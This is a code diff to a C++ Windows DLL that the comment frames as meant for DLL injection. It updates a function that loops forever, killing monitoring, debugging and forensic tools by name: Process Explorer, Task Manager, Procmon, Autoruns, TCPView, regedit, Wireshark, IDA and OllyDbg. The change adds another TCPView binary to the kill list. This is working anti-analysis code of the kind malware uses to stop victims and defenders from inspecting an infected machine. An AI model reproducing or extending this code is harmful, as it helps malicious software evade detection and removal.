@@ -16,7 +16,7 @@ DLL format allows for simple DLL injection :)
 
 // Infinite loop that searches for processes by name and kills them
 void termProcs() {
-    std::vector<std::string> denylist{ "procexp.exe", "procexp64.exe", "Tcpview.exe", "Autoruns.exe", "Autoruns64.exe", "autorunsc.exe", "autorunsc64.exe", "Taskmgr.exe", "Procmon.exe", "Procmon64.exe", "ida64.exe", "OLLYDBG.EXE", "regedit.exe", "Wireshark.exe" };
+    std::vector<std::string> denylist{ "procexp.exe", "procexp64.exe", "Tcpview.exe", "tcpview64.exe", "Autoruns.exe", "Autoruns64.exe", "autorunsc.exe", "autorunsc64.exe", "Taskmgr.exe", "Procmon.exe", "Procmon64.exe", "ida64.exe", "OLLYDBG.EXE", "regedit.exe", "Wireshark.exe" };
     while (true) {
         HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         PROCESSENTRY32 procEntry;
@@ -58,4 +58,3 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     }
     return TRUE;
 }
-
